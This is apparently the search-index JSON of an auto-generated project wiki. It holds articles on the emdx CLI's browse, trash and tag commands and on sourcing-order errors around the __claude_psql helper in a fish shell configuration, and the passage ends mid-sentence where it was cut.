{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Knowledge Base Wiki","text":"<p>Auto-generated wiki with 19 articles and 349 entity pages.</p>"},{"location":"#articles","title":"Articles","text":"<ul> <li>**kwargs: Any, TYPE_CHECKING, and Any Type Removal Analysis \u2014 22 sources</li> <li>--json: emdx agent and emdx agent instructions \u2014 11 sources</li> <li>Dendron Hierarchy System: Flat Files, Dot-Notation, and Schema-Driven Structure \u2014 11 sources</li> <li>Dream Journal: Smart Priming and Master Gameplan \u2014 23 sources</li> <li>EMDX Implementation Planning: Best Practices Guide \u2014 10 sources</li> <li>EMDX Task and Document Linking: <code>--task</code> and <code>--done</code> Flags \u2014 12 sources</li> <li>Prompt, Blocked State, and Execution ID Tracking in EMDX \u2014 20 sources</li> <li>Semantic Scholar: Radical Scope Limitation and Recommendation Graph \u2014 9 sources</li> <li>browse.py, trash.py, and tags.py \u2014 Command Layer Architecture \u2014 28 sources</li> <li>claude-config.fish: __claude_psql and root cause \u2014 14 sources</li> <li>claude-find, claude-save, and simplicity \u2014 10 sources</li> <li>documents.py: emdx Models and Database Layer \u2014 18 sources</li> <li>domain.topic.subtopic, Graphiti, and llms.txt: Wiki Generation Architecture \u2014 10 sources</li> <li>emdx Configuration Architecture \u2014 13 sources</li> <li>emdx prime and Smart Context Features \u2014 16 sources</li> <li>emdx: Parallel Task Execution with _run_parallel() \u2014 23 sources</li> <li>emdx: services and synthesis_service.py \u2014 12 sources</li> <li>input_tokens / output_tokens / tokens_used \u2014 19 sources</li> <li>shlex.split(): shell=True and --each \u2014 29 sources</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/","title":"browse.py, trash.py, and tags.py \u2014 Command Layer Architecture","text":""},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#overview","title":"Overview","text":"<p>The <code>browse.py</code>, <code>trash.py</code>, and <code>tags.py</code> modules comprise EMDX's document management and organization CLI layer. Together they provide ~880 lines of user-facing command implementations for browsing documents, managing soft-deleted content, and organizing content with tags. All three follow the Typer framework pattern with Rich library formatting for human-readable output and JSON modes for programmatic access.</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#browsepy-document-browser-and-statistics","title":"browse.py: Document Browser and Statistics","text":"<p>Purpose: Interactive TUI browser entry point and document analytics.</p> <p>Core Commands: - <code>emdx browse</code> / <code>emdx gui</code> \u2014 Launch Textual TUI for interactive document/task browsing - <code>emdx browse list</code> \u2014 List all documents with filtering by project - <code>emdx browse recent</code> \u2014 Show most recently accessed documents - <code>emdx browse stats</code> \u2014 Display knowledge base statistics with project breakdowns - <code>emdx view &lt;id&gt;</code> \u2014 Display full document content with metadata - <code>emdx edit &lt;id&gt;</code> \u2014 Open document in $EDITOR - <code>emdx delete &lt;id&gt;</code> \u2014 Move document to trash (soft delete)</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#tui-integration","title":"TUI Integration","text":"<p>CRITICAL WARNING: Never run <code>emdx gui</code> in Claude Code sessions \u2014 the TUI launches an interactive full-screen application that captures terminal input, causing sessions to hang. This is documented in <code>CLAUDE.md</code>.</p> <p>The TUI mode calls <code>run_browser()</code> from <code>emdx/ui/run_browser.py</code>, which initializes Textual's <code>BrowserApp</code> with multiple browser modes: - Document browser (default) \u2014 Navigate document hierarchy - File browser \u2014 Watch and save files - Git browser \u2014 Repository activity - Log browser \u2014 Execution logs - Task browser \u2014 Task management - Agent browser \u2014 Agent configurations</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#statistics-and-analytics","title":"Statistics and Analytics","text":"<p>Document statistics are grouped by project and stage:</p> <pre><code>SELECT project, stage, COUNT(*) \nFROM documents \nGROUP BY project, stage\n</code></pre> <p>When <code>--detailed</code> flag is used, shows access pattern histograms:</p> <pre><code>CASE\n    WHEN access_count = 0 THEN 'Never accessed'\n    WHEN access_count &lt;= 5 THEN '1-5 views'\n    WHEN access_count &lt;= 10 THEN '6-10 views'\n    ...\nEND as view_range\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#output-modes","title":"Output Modes","text":"<p>Following the CLI Output Mode Convention: - Default: Plain text output (machine/pipe friendly) - <code>--rich</code> flag: Colored Rich markup (panels, syntax highlighting, markdown rendering) - <code>--json</code> flag: Structured machine output - Uses <code>print()</code> for plain output, <code>console.print()</code> only in <code>--rich</code> mode</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#refactoring-pr-565","title":"Refactoring (PR #565)","text":"<p>Adopted <code>@combined_decorator</code> and <code>require_document()</code> helpers, removing ~30 lines of boilerplate:</p> <p>Before:</p> <pre><code>try:\n    db.ensure_schema()\n    doc = get_document(identifier)\n    if not doc:\n        console.print(\"[red]Error: Document not found[/red]\")\n        raise typer.Exit(1)\n    # ... command logic\nexcept Exception as e:\n    console.print(f\"[red]Error: {e}[/red]\")\n    raise typer.Exit(1)\n</code></pre> <p>After:</p> <pre><code>@combined_decorator(\"viewing document\")\ndef view(identifier: str):\n    doc = require_document(identifier)\n    # ... command logic\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#trashpy-soft-delete-lifecycle-management","title":"trash.py: Soft Delete Lifecycle Management","text":"<p>Purpose: Trash/restore/purge operations with batch support and time-based filtering.</p> <p>Core Commands: - <code>emdx trash &lt;ids...&gt;</code> \u2014 Soft delete documents (sets <code>deleted_at</code> timestamp) - <code>emdx trash list</code> \u2014 Show trashed documents - <code>emdx restore &lt;ids...&gt;</code> \u2014 Restore documents from trash - <code>emdx trash empty</code> \u2014 Permanently delete trashed documents</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#batch-operations","title":"Batch Operations","text":"<p>All commands support flexible ID specification: - Multiple IDs: <code>emdx trash 42 43 44</code> - ID ranges: <code>emdx trash 10-20</code> (expands to <code>[10, 11, ..., 20]</code>) - Mixed syntax: <code>emdx trash 5 10-12 20</code> \u2192 <code>[5, 10, 11, 12, 20]</code> - <code>--all</code> flag: <code>emdx trash restore --all</code> (applies to all trashed documents)</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#time-based-filtering","title":"Time-Based Filtering","text":"<p>Optional aging filters:</p> <pre><code># List only recently trashed\ndays: int | None = typer.Option(None, \"--days\", \"-d\")\n\n# Purge only old items\nolder_than: int | None = typer.Option(None, \"--older-than\")\n</code></pre> <p>Example: <code>emdx trash empty --older-than 30</code> removes documents trashed more than 30 days ago.</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#safety-mechanisms","title":"Safety Mechanisms","text":"<p>Soft Delete Pattern: - Sets <code>deleted_at</code> timestamp (preserves data) - Clears <code>deleted_at</code> on restore - Documents remain searchable in trash views</p> <p>Purge Warnings: Before permanent deletion (<code>empty</code> command): - Shows document count to be deleted - Uses <code>Confirm.ask()</code> from Rich for confirmation - Requires <code>--force</code> flag to skip prompt - Warning text: \"This action cannot be undone!\"</p> <p>Database Operations:</p> <pre><code>UPDATE documents SET deleted_at = CURRENT_TIMESTAMP WHERE id = ?  # Trash\nUPDATE documents SET deleted_at = NULL WHERE id = ?               # Restore\nDELETE FROM documents WHERE id = ?                                # Purge\n</code></pre> <p>Purge performs cascading cleanup: - Removes document row - Deletes associated tags (<code>DELETE FROM document_tags WHERE document_id = ?</code>) - Removes embeddings if index exists - Cleans up linked files</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#refactoring-pr-565_1","title":"Refactoring (PR #565)","text":"<p>Removed ~40 lines of boilerplate by adopting command helpers. Commands are now &lt;10 lines each:</p> <pre><code>@trash_app.command(\"restore\")\n@combined_decorator(\"restoring document\")\ndef restore_command(identifier: str) -&gt; None:\n    doc = require_document(identifier)\n    restore_document(doc[\"id\"])\n    console.print(f\"[green]\u2705 Restored document #{doc['id']}: {doc['title']}[/green]\")\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#tagspy-flexible-tag-management-system","title":"tags.py: Flexible Tag Management System","text":"<p>Purpose: Tag CRUD operations with emoji aliases, ML-powered suggestions, and batch auto-tagging.</p> <p>Core Commands: - <code>emdx tag add &lt;id&gt; [tags...]</code> \u2014 Manually add tags to a document - <code>emdx tag add &lt;id&gt; --auto</code> \u2014 Apply high-confidence auto-suggested tags - <code>emdx tag add &lt;id&gt; --suggest</code> \u2014 Show ML-based tag suggestions with confidence scores - <code>emdx tag remove &lt;id&gt; [tags...]</code> \u2014 Remove tags from a document - <code>emdx tag list</code> \u2014 Show all tags with usage counts - <code>emdx tag legend</code> \u2014 Display emoji-to-text-alias mapping - <code>emdx tag rename &lt;old&gt; &lt;new&gt;</code> \u2014 Rename tag globally across all documents - <code>emdx tag merge [tags...] --into &lt;target&gt;</code> \u2014 Merge multiple tags into one - <code>emdx tag batch</code> \u2014 Batch auto-tag untagged documents with ML suggestions</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#emoji-alias-system","title":"Emoji Alias System","text":"<p>Text-to-emoji conversion via <code>emdx/config/tagging_rules.py</code>:</p> <pre><code>TAG_CONFIG = {\n    \"gameplan\": \"\ud83c\udfaf\",\n    \"active\": \"\ud83d\udfe2\",\n    \"done\": \"\u2705\",\n    \"blocked\": \"\ud83d\udeab\",\n    \"success\": \"\ud83c\udf89\",\n    \"failed\": \"\u274c\",\n    \"analysis\": \"\ud83d\udcca\",\n    \"security\": \"\ud83d\udd12\"\n}\n</code></pre> <p>Users can specify tags as plain text or emojis; <code>normalize_tag()</code> converts both to canonical emoji form for storage:</p> <pre><code>emdx tag add 42 gameplan active    # Text aliases\nemdx tag add 42 \ud83c\udfaf \u26a1              # Direct emoji input\n# Both result in same stored tags: [\"\ud83c\udfaf\", \"\u26a1\"]\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#auto-tagging-integration","title":"Auto-Tagging Integration","text":"<p>Uses <code>AutoTagger</code> service for ML-powered suggestions:</p> <pre><code>from emdx.services.auto_tagger import AutoTagger\n\ntagger = AutoTagger()\nsuggestions = tagger.suggest_tags(doc_id)\n# Returns: [(tag_name, confidence), ...]\n</code></pre> <p>Batch Auto-Tag Workflow: 1. Analyze all untagged documents (or filtered subset) 2. Generate tag suggestions with confidence scores 3. Filter by confidence threshold (default 0.7 = 70%) 4. Show preview of first 10 documents 5. Dry-run mode (default) or execute with <code>--execute</code> 6. Progress spinner during application</p> <p>Example:</p> <pre><code>$ emdx tag batch --confidence 0.8 --execute\nAnalyzing 45 untagged documents...\nFound 32 documents with high-confidence suggestions\nApplying tags to 32 documents... \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 100%\n\u2705 Applied 87 tags across 32 documents\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#database-schema","title":"Database Schema","text":"<p>Many-to-many relationship:</p> <pre><code>CREATE TABLE tags (\n    id INTEGER PRIMARY KEY,\n    name TEXT UNIQUE NOT NULL\n);\n\nCREATE TABLE document_tags (\n    document_id INTEGER,\n    tag_id INTEGER,\n    FOREIGN KEY (document_id) REFERENCES documents(id) ON DELETE CASCADE,\n    FOREIGN KEY (tag_id) REFERENCES tags(id) ON DELETE CASCADE,\n    UNIQUE(document_id, tag_id)\n);\n</code></pre> <p>Tag counting query pattern:</p> <pre><code>SELECT t.name, COUNT(*) as count \nFROM tags t\nJOIN document_tags dt ON t.id = dt.tag_id\nGROUP BY t.name \nORDER BY count DESC\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#multi-tag-search","title":"Multi-Tag Search","text":"<p>From CLI Reference: - <code>--tags \"gameplan,active\"</code> \u2014 Comma-separated = AND logic (both tags required) - <code>--any-tags</code> flag \u2014 Enables OR logic (any tag matches)</p> <p>Important limitation: - <code>emdx find</code> does NOT support OR/AND/NOT operators in query string - <code>escape_fts5_query()</code> quotes each term, making operators literal - Use separate <code>emdx find</code> calls or <code>--tags</code> with <code>--any-tags</code> for OR logic</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#tags-vs-categories-critical-distinction","title":"Tags vs Categories (CRITICAL DISTINCTION)","text":"<p>Documents use plain text tags for flexible classification: - Tags: <code>gameplan</code>, <code>active</code>, <code>analysis</code>, <code>security</code>, <code>blocked</code> - Status tracking: <code>active</code> (working), <code>done</code> (completed), <code>blocked</code> (stuck) - Outcome: <code>success</code>, <code>failed</code>, <code>partial</code></p> <p>Tasks use categories and epics (NOT tags): - <code>--cat FEAT</code> / <code>--cat FIX</code> / <code>--cat ARCH</code> for categorization - <code>--epic &lt;id&gt;</code> for grouping under parent epic - <code>emdx task cat list</code> to see available categories - <code>emdx task epic list</code> to see active epics</p> <p>This separation allows flexible document organization while maintaining structured project management.</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#refactoring-pr-565_2","title":"Refactoring (PR #565)","text":"<p>Removed ~60 lines of error handling boilerplate across 6 commands by adopting <code>@combined_decorator</code> + <code>require_document()</code>.</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#architecture-and-design-patterns","title":"Architecture and Design Patterns","text":""},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#1-command-layer-responsibilities","title":"1. Command Layer Responsibilities","text":"<p>All three modules follow standard CLI layering: - Input validation \u2014 Parse Typer arguments, validate ID syntax, check flags - Business logic delegation \u2014 Call database/model/service functions - Output formatting \u2014 Render Rich tables/panels or JSON</p> <p>None execute raw SQL \u2014 they delegate to typed functions in <code>emdx/database/</code>: - <code>browse.py</code> \u2192 <code>get_documents(project=project)</code>, <code>get_recent_documents()</code> - <code>trash.py</code> \u2192 <code>soft_delete_document()</code>, <code>restore_document()</code>, <code>hard_delete_documents()</code> - <code>tags.py</code> \u2192 <code>add_tags()</code>, <code>remove_tags()</code>, <code>get_all_tags(project=project)</code></p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#2-shared-infrastructure","title":"2. Shared Infrastructure","text":"<p>All three modules leverage: - Shared console: <code>from emdx.utils.output import console</code> (Track B deduplication) - Error handling decorator: <code>@handle_cli_errors</code> from <code>emdx.utils.cli</code> - Command helpers: <code>@combined_decorator</code>, <code>require_document()</code> from <code>emdx.commands._helpers</code> - Database transactions: All multi-step operations wrapped with rollback safety - Rich/Plain output modes: <code>--rich</code> flag for human-readable formatting</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#3-hybrid-identifier-resolution","title":"3. Hybrid Identifier Resolution","text":"<p>All three support flexible document identification:</p> <pre><code>def get_document(identifier: str | int) -&gt; dict | None:\n    \"\"\"Fetch by ID (int) or title substring (str).\"\"\"\n    if isinstance(identifier, int):\n        return _fetch_by_id(identifier)\n    return _search_by_title_substring(identifier)\n</code></pre> <p>Examples:</p> <pre><code>emdx view 42                    # By ID\nemdx view \"architecture notes\"  # By title substring\nemdx trash restore 42-50        # ID range\n</code></pre>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#4-text-truncation","title":"4. Text Truncation","text":"<p>All use canonical <code>truncate()</code> function from <code>emdx/utils/text_formatting.py</code>:</p> <pre><code>from emdx.config.constants import TITLE_TRUNCATE_LENGTH\nfrom emdx.utils.text_formatting import truncate\n\ntitle = truncate(doc['title'], TITLE_TRUNCATE_LENGTH)  # Max 50 chars\n</code></pre> <p>Constants: - <code>TITLE_TRUNCATE_LENGTH = 50</code> - <code>DESCRIPTION_TRUNCATE_LENGTH = 40</code> - <code>PATH_TRUNCATE_LENGTH = 35</code></p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#5-optional-filters-as-none","title":"5. Optional Filters as <code>| None</code>","text":"<p>All filter parameters use <code>| None</code> type annotations with <code>typer.Option(None, ...)</code>: - browse.py: <code>project: str | None</code> - trash.py: <code>days: int | None</code>, <code>older_than: int | None</code> - tags.py: <code>project: str | None</code>, <code>limit: int | None</code></p> <p>This pattern is necessary and intentional \u2014 None represents \"no filter applied\". The database layer interprets None as \"include all\" and builds SQL queries accordingly. From the None Type Analysis audit: 0 bugs found \u2014 all <code>| None</code> annotations match runtime behavior.</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#code-quality-and-technical-debt","title":"Code Quality and Technical Debt","text":""},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#strengths","title":"Strengths","text":"<ul> <li>Clear separation of concerns: Commands handle I/O, database handles persistence</li> <li>Rich user feedback: Emojis, colors, progress spinners enhance UX</li> <li>Safety-first design: Destructive operations require confirmation</li> <li>Multi-format output: Supports human (Rich) and machine (JSON/CSV) readers</li> <li>Comprehensive tests: All three have test coverage in <code>tests/test_commands_*.py</code></li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#technical-debt-from-architecture-analysis-6330","title":"Technical Debt (from Architecture Analysis #6330)","text":"<p>RESOLVED (PR #565): - \u2705 Command helpers adopted \u2014 <code>@combined_decorator</code> eliminates ~130 lines of boilerplate - \u2705 Document validation centralized \u2014 <code>require_document()</code> replaces repeated patterns - \u2705 Error handling standardized \u2014 consistent error messages across all commands</p> <p>REMAINING: 1. Type safety: Still use raw dicts from sqlite3.Row \u2014 no TypedDict definitions 2. Service layer bypass: browse.py uses <code>db.get_connection()</code> directly for stats (should go through service) 3. Duplicate datetime parsing: Three separate implementations across database modules 4. Global state dependency: All rely on <code>db_connection</code> singleton, complicating test isolation</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#recommended-improvements","title":"Recommended Improvements","text":"<p>1. Define TypedDict for Document:</p> <pre><code>from typing import TypedDict\n\nclass DocumentDict(TypedDict):\n    id: int\n    title: str\n    content: str\n    project: str | None\n    created_at: datetime\n    deleted_at: datetime | None\n</code></pre> <p>2. Centralize datetime parsing:</p> <pre><code># utils/datetime_utils.py\ndef parse_sqlite_datetime(s: str | None) -&gt; datetime | None:\n    if not s:\n        return None\n    return datetime.fromisoformat(s)\n</code></pre> <p>3. Consistent JSON output flag: Current state: - browse.py: <code>--format json</code> - tags.py: <code>--json</code> - trash.py: No JSON mode</p> <p>Should standardize on <code>--json</code> across all three.</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#integration-points","title":"Integration Points","text":""},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#with-database-layer","title":"With Database Layer","text":"<ul> <li><code>emdx.database.core</code> \u2014 CRUD operations</li> <li><code>emdx.database.search</code> \u2014 Full-text search via FTS5</li> <li><code>emdx.database.links</code> \u2014 Link graph queries</li> <li><code>emdx.database.documents</code> \u2014 Document lifecycle (soft delete, restore, access tracking)</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#with-services-layer","title":"With Services Layer","text":"<ul> <li>tags.py \u2192 <code>services/auto_tagger.py</code> for ML-based tag suggestions</li> <li>browse.py \u2192 <code>services/document_manager.py</code> for health scoring and batch operations</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#with-ui-layer","title":"With UI Layer","text":"<ul> <li>browse.py \u2192 <code>ui/run_browser.py</code> \u2192 <code>BrowserApp</code> (Textual TUI)</li> <li>browse.py \u2192 <code>ui/document_browser.py</code> for document list view (1122 LOC)</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#with-utils","title":"With Utils","text":"<ul> <li><code>utils/text_formatting.truncate()</code> \u2014 Text truncation with ellipsis</li> <li><code>utils/tags.normalize_tag()</code> \u2014 Emoji alias resolution</li> <li><code>utils/cli.handle_cli_errors</code> \u2014 Standardized error display</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#performance-characteristics","title":"Performance Characteristics","text":"<ul> <li>browse.py JSON mode: O(n) scan when no filter applied \u2014 can be slow on large KBs (10k+ docs). Use <code>--project</code> to scope.</li> <li>trash.py batch operations: Uses <code>executemany()</code> for soft deletes (fast), but hard deletes are sequential (~100ms per document for large purges)</li> <li>tags.py list: JOIN query is indexed on <code>document_tags.tag_id</code>, fast even with 100k+ tag assignments. Defaults to limit of 50 for readable output.</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#testing-coverage","title":"Testing Coverage","text":"<p>From test coverage audit (#6162): - \u2705 <code>browse.py</code> \u2014 <code>tests/test_browse.py</code>, <code>tests/test_commands_core.py</code> - \u2705 <code>tags.py</code> \u2014 <code>tests/test_tags.py</code>, <code>tests/test_commands_tags.py</code> - \u274c <code>trash.py</code> \u2014 NO test coverage (identified gap)</p> <p>Recommendation: Priority 2 for <code>trash.py</code> testing (user-facing document lifecycle command).</p>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#quick-reference","title":"Quick Reference","text":"Command Purpose Output Modes <code>emdx gui</code> Launch TUI browser Interactive TUI <code>emdx browse list</code> List all documents Table / JSON / CSV <code>emdx browse recent</code> Recently accessed docs Table / JSON <code>emdx browse stats</code> KB statistics Rich panels / JSON <code>emdx view &lt;id&gt;</code> View document Markdown / Plain <code>emdx trash &lt;ids&gt;</code> Soft delete Confirmation msg <code>emdx restore &lt;ids&gt;</code> Undelete Confirmation msg <code>emdx trash empty</code> Permanent delete User prompt + count <code>emdx tag add &lt;id&gt; &lt;tags&gt;</code> Apply tags Success message <code>emdx tag batch</code> Bulk auto-tag Progress spinner <code>emdx tag list</code> Show all tags Table with counts"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#key-gotchas","title":"Key Gotchas","text":""},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#browsepy","title":"browse.py","text":"<ul> <li>NEVER call <code>emdx gui</code> in Claude Code sessions \u2014 it hangs the terminal</li> <li>JSON mode is safe for automation: <code>emdx gui --project emdx --json | jq</code></li> <li>Access tracking bug fix: <code>get_document(track_access=False)</code> for internal lookups</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#trashpy","title":"trash.py","text":"<ul> <li><code>--all</code> requires explicit confirmation unless <code>--force</code> is used</li> <li>Hard delete is permanent \u2014 no undo for <code>empty</code> command</li> <li>Mutually exclusive flags \u2014 can't use <code>emdx restore 42 --all</code> together</li> </ul>"},{"location":"articles/browsepy-trashpy-and-tagspy-command-layer-architecture/#tagspy","title":"tags.py","text":"<ul> <li>Tags stored as emojis \u2014 database queries must use emoji form (\ud83c\udfaf not \"gameplan\")</li> <li>One-way normalization \u2014 <code>normalize_tag(\"gameplan\")</code> \u2192 \"\ud83c\udfaf\", reverse requires <code>TAG_CONFIG</code> lookup</li> <li>FTS5 tag search is AND by default \u2014 must use <code>--any-tags</code> for OR logic</li> <li>Documents use tags, Tasks use categories \u2014 don't confuse the two systems</li> </ul> <p>Generated from 28 source documents</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/","title":"claude-config.fish: __claude_psql and root cause","text":""},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#overview","title":"Overview","text":"<p>The <code>claude-config.fish</code> file is a core component of the clauding knowledge base system that provides centralized database configuration and a critical helper function (<code>__claude_psql</code>) used throughout the codebase. Despite its importance, improper sourcing order has historically caused \"Unknown command\" errors that confuse users and break the entire system.</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#__claude_psql-helper-function","title":"__claude_psql Helper Function","text":"<p>The <code>__claude_psql</code> function is a database connection wrapper that:</p> <ul> <li>Eliminates hardcoded database credentials scattered throughout the codebase</li> <li>Uses environment variables for configuration (<code>PGUSER</code>, <code>PGDATABASE</code>, etc.)</li> <li>Provides a consistent interface for all PostgreSQL operations</li> <li>Enables the security layer (<code>__claude_safe_insert</code>) to function properly</li> </ul>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#sourcing-order-dependency","title":"Sourcing Order Dependency","text":"<p>Fish functions have an explicit dependency chain that must be respected:</p> <ol> <li>claude-config.fish - Defines <code>__claude_psql</code> and environment variables</li> <li>claude-security.fish - Calls <code>__claude_psql</code> for safe SQL operations</li> <li>claude-functions.fish - Sources <code>claude-security.fish</code> and uses both helpers</li> </ol> <p>If <code>claude-config.fish</code> is not sourced first, any function that needs <code>__claude_psql</code> fails with:</p> <pre><code>__claude_psql: Unknown command\n</code></pre>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#root-cause-analysis","title":"Root Cause Analysis","text":""},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#the-core-problem","title":"The Core Problem","text":"<p>The <code>claude-save</code> command and other claude functions fail with psql parameter errors when called through the Bash tool. The specific error pattern:</p> <pre><code>psql: warning: extra command-line argument \"title=...\" ignored\nERROR:  syntax error at or near \"-\"\nLINE 1: -v\n        ^\nERROR:  syntax error at or near \":\"\nLINE 3:         VALUES (:'title', :'content', :'project',\n                        ^\n</code></pre> <p>This error stems from two separate issues:</p> <ol> <li>Missing <code>__claude_psql</code> function - The helper isn't loaded because <code>claude-config.fish</code> wasn't sourced</li> <li>Shell escaping issues - When commands pass through multiple shell layers (Bash tool \u2192 fish \u2192 psql), quotes and special characters get mangled</li> </ol>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#why-it-happens","title":"Why It Happens","text":"<p>The installation process creates <code>~/.config/fish/conf.d/claude.fish</code> with environment variables but does not source the function definitions from <code>claude-config.fish</code>. Users must manually add sourcing commands to their fish config, but:</p> <ul> <li>The documentation mentions this in \"Permanent Setup\" but it's not prominent</li> <li>Error messages don't indicate the missing dependency</li> <li>The installation doesn't validate that sourcing is configured correctly</li> </ul>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#dependency-chain","title":"Dependency Chain","text":"<pre><code>claude-functions.fish\n  \u2514\u2500 sources claude-security.fish dynamically\n      \u2514\u2500 calls __claude_psql function\n          \u2514\u2500 defined in claude-config.fish (NOT SOURCED!)\n</code></pre>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#impact","title":"Impact","text":"<ul> <li>Users get cryptic errors when trying to use claude commands</li> <li>Natural workflow of saving documents is broken</li> <li>Forces use of lower-level MCP PostgreSQL tools</li> <li>Creates confusion about whether the system is properly installed</li> </ul>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#security-improvements-plan-2081","title":"Security Improvements (Plan #2081)","text":"<p>The clauding project implemented proper security fixes that depend on <code>claude-config.fish</code>:</p> <ul> <li>claude-security.fish module uses PostgreSQL's <code>\\set</code> commands with parameterized queries</li> <li>No hardcoded credentials in main functions (environment variables only)</li> <li><code>__claude_safe_insert</code> function prevents SQL injection</li> </ul> <p>However, completion files still contain hardcoded credentials (<code>psql -U alexrockwell -d claudedb</code>), creating a security inconsistency where the main system is secure but completions are not.</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#configuration-system-design","title":"Configuration System Design","text":"<p><code>claude-config.fish</code> centralizes:</p> <ul> <li>Database connection parameters (username, database, host, port)</li> <li><code>__claude_psql</code> wrapper for consistent database access</li> <li>Environment variable configuration</li> </ul> <p>This design requires that <code>claude-config.fish</code> be sourced before any other claude module.</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#multiple-function-versions-problem","title":"Multiple Function Versions Problem","text":"<p>The codebase contains duplicate implementations:</p> <ul> <li><code>claude-functions.fish</code></li> <li><code>claude-functions-enhanced.fish</code></li> <li><code>claude-functions-scale.fish</code></li> </ul> <p>These variants all expect <code>__claude_psql</code> to exist, amplifying the sourcing order issue across the codebase.</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#correct-sourcing-pattern","title":"Correct Sourcing Pattern","text":"<p>To use clauding commands, source files in this exact order:</p> <pre><code>source ~/dev/worktrees/clauding-main/core/claude-config.fish\nsource ~/dev/worktrees/clauding-main/core/claude-functions.fish\nsource ~/dev/worktrees/clauding-main/core/claude-direct-fixed.fish\n</code></pre>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#proposed-solutions","title":"Proposed Solutions","text":"<p>Three approaches were identified to fix the sourcing issue:</p> <p>Option A: Auto-source in claude-functions.fish</p> <pre><code># At top of claude-functions.fish\nif not functions -q __claude_psql\n    source (dirname (status -f))/claude-config.fish\nend\n</code></pre> <p>Option B: Single entry point</p> <p>Create <code>claude-init.fish</code>:</p> <pre><code>#!/usr/bin/env fish\nset -l claude_dir (dirname (status -f))\nsource $claude_dir/claude-config.fish\nsource $claude_dir/claude-functions.fish\nsource $claude_dir/claude-direct-fixed.fish\necho \"\u2705 Claude knowledge base ready!\"\n</code></pre> <p>Option C: Update installer</p> <p>Modify <code>install-claude.fish</code> to write complete sourcing commands to the user's fish config automatically.</p>"},{"location":"articles/claude-configfish-claudepsql-and-root-cause/#error-detection","title":"Error Detection","text":"<p>A proposed improvement is to add runtime checks:</p> <pre><code># In claude-functions.fish\nif not functions -q __claude_psql\n    echo \"ERROR: claude-config.fish not loaded. Please source it first.\" &gt;&amp;2\n    return 1\nend\n</code></pre> <p>This provides a helpful error message instead of \"Unknown 